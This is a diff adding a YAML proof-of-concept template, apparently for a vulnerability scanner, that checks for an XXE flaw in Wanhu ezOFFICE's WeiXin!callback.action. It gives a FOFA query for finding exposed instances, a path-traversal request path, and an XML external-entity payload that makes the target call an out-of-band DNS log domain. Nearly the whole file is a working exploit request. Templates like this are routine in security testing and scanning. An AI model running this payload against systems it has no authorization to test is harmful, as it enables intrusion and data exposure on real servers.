@@ -1,0 +1,22 @@
+id: poc-yaml-whir-ezoffice-weixin-callback-action-xxe
+info:
+  name: 万户 ezOFFICE WeiXin!callback.action XXE漏洞
+  severity: high
+  tags:
+  - xxe
+  - DNSLOG
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../WeiXin!callback.action
+  headers:
+    Content-Type: text/xml; charset=utf-8
+  data: '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://{{.domain}}"> ]>
+
+    <foo>&xxe;</foo>'
+  expression: status_code == 404 && body == "" && reverse.Verify()
+transport: http
